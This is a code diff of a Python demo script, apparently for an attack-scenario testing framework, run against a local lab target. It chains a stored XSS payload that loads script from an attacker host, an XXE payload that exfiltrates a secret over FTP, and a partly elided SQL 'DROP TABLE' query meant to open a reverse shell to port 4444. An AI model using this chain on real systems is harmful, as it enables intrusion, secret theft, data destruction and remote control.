@@ -1,94 +1,101 @@
 #!/usr/bin/env python3
 
+import os
+
 import requests
 
 from horrors import (
-    events,
     scenarios,
     services,
     triggers,
 )
 
 
-class Vulnerable(scenarios.Scenario):
+async def plant_xss(scenario):
+    """Post XSS payload
 
-    POST_HEADERS = {'Content-Type': 'application/x-www-form-urlencoded'}
+    """
+    await scenario.background(
+        requests.post,
+        'http://{rhost}:{rport}/test/'.format(**scenario.context),
+        data='field=<script src=http://{lhost}:{lport_http}/xss.js></script>'.format(**scenario.context),
+        headers=scenario.context['post_headers'],
+        proxies=scenario.context['proxy']
+    )
 
-    async def stage1(self):
-        """Post XSS payload
 
-        """
-        requests.post(
-            'http://{rhost}:{rport}/test/'.format(**self.context),
-            data='field=<script src=http://{lhost}:{lport_http}/xss.js></script>'.format(**self.context),
-            headers=self.POST_HEADERS,
-            proxies=self.context['proxy']
-        )
+async def get_new_account(scenario):
+    """Wait for `xss` event triggered when request path contains `xss.js`
 
-    async def stage2(self):
-        """Wait for `xss` event triggered when request path contains `xss.js`
+    """
+    result = await scenario.background(
+        requests.get,
+        'http://{rhost}:{rport}/userid/{username}'.format(**scenario.context),
+        proxies=scenario.context['proxy']
+    )
+    scenario.context['userid'] = result.text
 
-        """
-        await events.Event.wait('xss')
-        res = requests.get(
-            'http://{rhost}:{rport}/userid/{username}'.format(**self.context),
-            proxies=self.context['proxy']
-        )
-        self.context['userid'] = res.text
 
-    async def stage3(self):
-        """Post XXE payload using value `userid` stored in local context
+async def send_xxe(scenario):
+    """Post XXE payload using value `userid` stored in local context
 
-        """
-        requests.post(
-            'http://{rhost}:{rport}/xml-import/'.format(**self.context),
-            data='<?xml version="1.0" ?><something evil="{userid}">ftp://{lhost}:{lport_ftp}</something>'.format(**self.context),
-            headers=self.POST_HEADERS,
-            proxies=self.context['proxy']
-        )
+    """
+    await scenario.background(
+        requests.post,
+        'http://{rhost}:{rport}/xml-import/'.format(**scenario.context),
+        data='<?xml version="1.0" ?><something evil="{userid}">ftp://{lhost}:{lport_ftp}</something>'.format(**scenario.context),
+        headers=scenario.context['post_headers'],
+        proxies=scenario.context['proxy']
+    )
 
-    async def stage4(self):
-        """Wait for `xxe` event triggered when remote client connects via FTP and sends the secret
 
-        """
-        await events.Event.wait('xxe')
-        requests.post(
-            'http://{rhost}:{rport}/query/'.format(**self.context),
-            data='secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(
-                secret=events.Event.lookup('secret'),
-                **self.context
-            ),
-            headers=self.POST_HEADERS,
-            proxies=self.context['proxy']
-        )
+async def reverse_shell(scenario):
+    """Wait for `xxe` event triggered when remote client connects via FTP and sends the secret
 
-    async def done(self):
-        print('Done! 8-]')
+    """
+    await scenario.background(
+        requests.post,
+        'http://{rhost}:{rport}/query/'.format(**scenario.context),
+        data='secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**scenario.context),
+        headers=scenario.context['post_headers'],
+        proxies=scenario.context['proxy']
+    )
+
+
+async def done(scenario):
+    print('Done! 8-]')
 
 
 if __name__ == "__main__":
+    context = {
+        'rhost': '127.0.0.1',
+        'rport': 8008,
+        'lhost': '127.0.0.1',
+        'lport_http': 8888,
+        'lport_reverse': 4444,
+        'lport_ftp': 2121,
+        'username': 'evil',
+        'proxy': {'http': 'http://127.0.0.1:8080'},
+        'post_headers': {'Content-Type': 'application/x-www-form-urlencoded'},
+    }
 
     httpd = services.HTTPStatic({
         '/': 'This is home page...',
-        '/xss.js': 'var payload = "something_is_wrong_here";',
+        '/xss.js': open(os.path.join(os.path.dirname(__file__), 'xss.js.template')).read().format(**context),
         '/timestamp': services.HTTPStatic.timestamp,
     })
-    httpd.send('xss', when=triggers.PathContains('xss.js'))
+    httpd.set_state('xss', when=triggers.PathContains('xss.js'))
 
     ftpd = services.FTPReader()
-    ftpd.send('xxe', when=triggers.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))
+    ftpd.set_state('xxe', when=triggers.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))
 
-    story = Vulnerable(
-        rhost='127.0.0.1',
-        rport=8008,
-        lhost='127.0.0.1',
-        lport_http=8888,
-        lport_reverse=4444,
-        lport_ftp=2121,
-        username='evil',
-        proxy={'http': 'http://127.0.0.1:8080'},
-    )
+    story = scenarios.Scenario(**context)
     story.debug()
     story.spawn(httpd)
     story.spawn(ftpd)
+    story.add(plant_xss)
+    story.add(get_new_account, when='xss')
+    story.add(send_xxe)
+    story.add(reverse_shell, when='xxe')
+    story.add(done)
     story.play()
